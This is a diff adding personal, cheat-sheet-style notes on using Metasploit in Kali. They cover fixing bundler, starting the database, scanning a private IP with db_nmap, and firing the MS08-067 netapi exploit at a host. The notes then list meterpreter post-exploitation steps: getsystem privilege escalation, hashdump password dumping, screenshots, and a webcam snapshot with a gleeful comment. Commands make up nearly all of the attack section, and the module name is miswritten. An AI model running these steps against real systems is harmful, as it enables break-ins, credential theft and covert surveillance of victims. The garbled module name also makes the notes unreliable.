@@ -1,0 +1,57 @@
+sudo gem install bundler
+
+cd /usr/share/metasploit-framework
+
+sudo gem install bundler:1.17.3
+
+Open the Terminal and run the following commands:
+
+cd /usr/share/metasploit-framework.
+Upgrade your bundler/setup : gem install bundler.
+Install bundle: bundle install.
+gem update --system.
+Restart Metasploit.
+
+
+msf5> db_nmap -sS -O -T 4 192.168.100.136
+
+
+Metasploit uses PostgreSQL as its database so it needs to be launched first.
+$ sudo service postgresql start
+
+Initialise the Metasploit PostgreSQL Database
+With PostgreSQL up and running, we next need to create and initialize the msf database.
+$ sudo msfdb init
+
+
+Launch msfconsole in Kali
+$ sudo msfconsole
+msf > db_status
+[*] postgresql connected to msf3
+
+if we have generated a nessus report file,
+vulnerabilities will be shown 
+
+
+search vulnerability
+
+show options
+
+exploit(ms08_67_netapi) > set RHOST 192.168.1.4
+exploit(ms08_67_netapi) > exploit
+
+meterpreter session opened
+
+pwd - shows current working directory.
+
+system32
+
+getsystem - attempt to get a privilege escalation
+
+hashdump - print out passwords.
+
+screenshot
+
+web_cam snap ( OH FUCK IT IS REAL :O )
+
+
